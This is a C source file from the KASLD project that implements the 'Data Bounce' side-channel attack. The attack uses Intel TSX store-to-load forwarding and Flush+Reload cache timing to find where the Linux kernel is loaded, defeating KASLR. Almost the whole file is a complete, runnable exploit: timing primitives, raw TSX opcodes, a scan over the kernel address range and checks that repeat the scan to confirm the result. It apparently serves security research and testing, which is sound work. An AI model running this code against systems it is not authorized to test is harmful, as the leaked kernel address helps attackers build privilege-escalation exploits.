// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Data Bounce side-channel KASLR bypass.
//
// Exploits store-to-load forwarding within an Intel TSX transaction.
// A transient store of 'X' to a kernel address is followed by a load
// from the same address. If the kernel page is mapped, the store buffer
// forwards the written value back to the load, which then indexes into a
// Flush+Reload probe array at offset 'X' * 4096 — producing a cache hit
// on that specific line. If the page is unmapped, the transaction aborts
// before the store buffer entry is created and no forwarding occurs.
//
// Unlike EchoLoad (which relies on Meltdown zero-return behavior), Data
// Bounce relies on store-to-load forwarding within TSX, which is a
// separate microarchitectural path. Data Bounce was found to be reliable
// in every tested configuration (bare metal and VMs, KPTI on and off).
//
// TSX (RTM) is required — the transient store must occur inside an
// xbegin/xabort window. Signal handler and speculation modes cannot
// suppress the fault early enough for the store to reach the store
// buffer, so those modes are not applicable for this technique.
//
// With KPTI enabled, the lowest detected address is typically
// __entry_text_start; with KPTI disabled, it is _stext.
//
// Technique by Claudio Canella, Michael Schwarz, Martin Haubenwallner,
// Martin Schwarzl, and Daniel Gruss:
// "KASLR: Break It, Fix It, Repeat" (Asia CCS 2020)
//
// References:
// https://cc0x1f.net/publications/kaslr.pdf
// https://github.com/cc0x1f/store-to-leak-forwarding-there-and-back-again
// https://i.blackhat.com/asia-20/Friday/asia-20-Canella-Store-To-Leak-Forwarding-There-And-Back-Again-wp.pdf
// ---
// <bcoles@gmail.com>

#if !defined(__x86_64__) && !defined(__amd64__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <cpuid.h>
#include <memory.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* =========================================================================
 * Configuration
 * =========================================================================
 */

/* Number of interleaved iterations over the full scan window. Each
 * address is probed once per iteration, and cache hits are accumulated.
 *
 * Uses the same statistical approach as entrybleed/echoload: many
 * interleaved iterations to smooth noise, followed by unanimity
 * verification. Flush+Reload is self-resetting (clflush at the end of
 * each probe), so repeated iterations do not accumulate cache state. */
#define DATABOUNCE_ITERATIONS 100
#define DATABOUNCE_WARMUP 5

/* Minimum number of cache hits (out of DATABOUNCE_ITERATIONS) for an
 * address to be considered mapped. */
#define DATABOUNCE_HIT_THRESHOLD 50

/* Number of verification sweeps. The initial sweep result must match
 * all verification sweeps exactly (unanimity check). */
#define DATABOUNCE_VERIFY 3

/* Scan window: uses kasld.h defines (KERNEL_BASE_MIN, KERNEL_BASE_MAX). */
#define SCAN_STEP (KERNEL_ALIGN)
#define SCAN_SLOTS                                                             \
  ((unsigned long)(KERNEL_BASE_MAX - KERNEL_BASE_MIN) / SCAN_STEP)

/* The sentinel value written transiently to the kernel address. The
 * Flush+Reload oracle checks probe['X' * 4096]. */
#define BOUNCE_CHAR 'X'

/* =========================================================================
 * Timing primitives (x86_64 only)
 *
 * Based on cacheutils.h by Daniel Gruss and Michael Schwarz (IAIK,
 * TU Graz / isec-tugraz). Original primitives (rdtsc, flush, reload):
 *   https://github.com/isec-tugraz/prefetch (Gruss, 2015)
 * Extended with TSX and signal-based fault suppression:
 *   https://github.com/isec-tugraz/ZombieLoad (Schwarz)
 * Used in the EchoLoad / Data Bounce reference implementation:
 *   https://github.com/cc0x1f/store-to-leak-forwarding-there-and-back-again
 * =========================================================================
 */

static size_t cache_miss_threshold;

static inline uint64_t rdtscp_time(void) {
  uint64_t lo, hi;
  __asm__ volatile("mfence\n\t"
                   "rdtscp\n\t"
                   "mov %%rax, %0\n\t"
                   "mov %%rdx, %1\n\t"
                   "mfence"
                   : "=r"(lo), "=r"(hi)
                   :
                   : "rax", "rcx", "rdx");
  return (hi << 32) | lo;
}

static inline void maccess(volatile void *p) {
  __asm__ volatile("movq (%0), %%rax" : : "c"(p) : "rax");
}

static inline void flush(volatile void *p) {
  __asm__ volatile("clflush 0(%0)" : : "c"(p) : "rax");
}

static int flush_reload(volatile void *ptr) {
  uint64_t start, end;
  start = rdtscp_time();
  maccess(ptr);
  end = rdtscp_time();
  flush(ptr);
  return (end - start) < cache_miss_threshold;
}

static size_t detect_flush_reload_threshold(void) {
  size_t reload_time = 0, flush_reload_time = 0;
  const size_t count = 1000000;
  size_t dummy[16];
  volatile size_t *ptr = dummy + 8;

  maccess((volatile void *)ptr);
  for (size_t i = 0; i < count; i++) {
    uint64_t s = rdtscp_time();
    maccess((volatile void *)ptr);
    uint64_t e = rdtscp_time();
    reload_time += (size_t)(e - s);
  }
  for (size_t i = 0; i < count; i++) {
    flush((volatile void *)ptr);
    uint64_t s = rdtscp_time();
    maccess((volatile void *)ptr);
    uint64_t e = rdtscp_time();
    flush_reload_time += (size_t)(e - s);
  }
  reload_time /= count;
  flush_reload_time /= count;

  return (flush_reload_time + reload_time * 2) / 3;
}

/* =========================================================================
 * TSX (RTM) — required for Data Bounce
 * =========================================================================
 */

static int has_rtm(void) {
  unsigned int eax, ebx, ecx, edx;
  if (__get_cpuid_max(0, NULL) >= 7) {
    __cpuid_count(7, 0, eax, ebx, ecx, edx);
    return (ebx >> 11) & 1;
  }
  return 0;
}

static inline unsigned int xbegin_wrapper(void) {
  unsigned int status;
  __asm__ volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00"
                   : "=a"(status)
                   : "a"(-1UL)
                   : "memory");
  return status;
}

static inline void xend_wrapper(void) {
  __asm__ volatile(".byte 0x0f,0x01,0xd5" ::: "memory");
}

static inline void xabort_wrapper(void) {
  __asm__ volatile(".byte 0xc6,0xf8,0x00" ::: "memory");
}

/* =========================================================================
 * CPU detection
 * =========================================================================
 */

static bool is_intel_cpu(void) {
  unsigned int eax, ebx, ecx, edx;
  __asm__ volatile("cpuid"
                   : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
                   : "a"(0)
                   :);
  /* "GenuineIntel" = EBX:EDX:ECX */
  return ebx == 0x756e6547 && edx == 0x49656e69 && ecx == 0x6c65746e;
}

static bool detect_kpti(void) {
  FILE *f = fopen("/proc/cpuinfo", "r");
  if (!f)
    return false;

  char *line = NULL;
  size_t len = 0;
  bool pti = false;
  while (getline(&line, &len, f) != -1) {
    if (strstr(line, "flags") == NULL)
      continue;
    if (strstr(line, " pti") != NULL) {
      pti = true;
      break;
    }
  }
  free(line);
  fclose(f);
  return pti;
}

/* =========================================================================
 * Probe array (Flush+Reload target)
 * =========================================================================
 */

static char __attribute__((aligned(4096))) probe[4096 * 256];

/* =========================================================================
 * Data Bounce single sweep
 * =========================================================================
 *
 * Scans [KERNEL_BASE_MIN, KERNEL_BASE_MAX) and returns the lowest
 * confirmed mapped address, or 0 if nothing was found.
 *
 * Uses interleaved iteration: visit every candidate address once per
 * iteration, repeat DATABOUNCE_ITERATIONS times, and accumulate
 * per-slot hit counts.
 */
static unsigned long databounce_sweep(void) {
  int hits[SCAN_SLOTS];
  memset(hits, 0, sizeof(hits));

  for (int iter = 0; iter < DATABOUNCE_ITERATIONS + DATABOUNCE_WARMUP; iter++) {
    volatile char *buffer = (volatile char *)KERNEL_BASE_MIN;

    for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
      flush(probe + BOUNCE_CHAR * 4096);

      if (xbegin_wrapper() == ~0u) {
        maccess(0);
        *buffer = BOUNCE_CHAR;
        /* NOP sled improves accuracy — gives the store buffer time to
         * forward the value before the transaction aborts. */
        __asm__ volatile("nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
                         "nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop");
        maccess(probe + *(volatile char *)buffer * 4096);
        xabort_wrapper();
      }
      xend_wrapper();

      if (iter >= DATABOUNCE_WARMUP && flush_reload(probe + BOUNCE_CHAR * 4096))
        hits[slot]++;

      buffer += SCAN_STEP;
    }
  }

  /* Return the lowest address above the hit threshold */
  for (unsigned long slot = 0; slot < SCAN_SLOTS; slot++) {
    if (hits[slot] >= DATABOUNCE_HIT_THRESHOLD)
      return KERNEL_BASE_MIN + slot * SCAN_STEP;
  }
  return 0;
}

/* =========================================================================
 * main
 * =========================================================================
 */
int main(void) {
  if (!getenv("KASLD_EXPERIMENTAL")) {
    fprintf(stderr, "[-] databounce: experimental component; "
                    "set KASLD_EXPERIMENTAL=1 to enable\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  if (!is_intel_cpu()) {
    fprintf(stderr,
            "[-] databounce: not an Intel CPU; attack not applicable\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  if (!has_rtm()) {
    fprintf(stderr, "[-] databounce: TSX/RTM not available; "
                    "required for store-to-load forwarding\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  fprintf(stderr, "[.] databounce: using TSX abort mode\n");

  memset(probe, 1, sizeof(probe));

  cache_miss_threshold = detect_flush_reload_threshold();
  fprintf(stderr, "[.] databounce: cache miss threshold: %zu cycles\n",
          cache_miss_threshold);

  /* Pin to a single core to reduce noise */
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(1, &set);
  sched_setaffinity(0, sizeof(set), &set);

  unsigned long addr = databounce_sweep();

  if (!addr) {
    fprintf(stderr, "[-] databounce: no kernel mapping detected "
                    "(CPU may not be vulnerable)\n");
    return 0;
  }

  /* Unanimity verification: repeat the full sweep and require every result to
   * match. If any sweep disagrees, the result is rejected entirely. */
  for (int v = 0; v < DATABOUNCE_VERIFY; v++) {
    if (addr != databounce_sweep()) {
      fprintf(stderr, "[-] databounce: inconsistent results. Aborting ...\n");
      return 0;
    }
  }

  bool pti = detect_kpti();
  const char *label =
      pti ? "databounce [__entry_text_start]" : "databounce [_stext]";

  fprintf(stderr, "[+] databounce: %s = 0x%016lx\n", label, addr);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr, label);

  return 0;
}
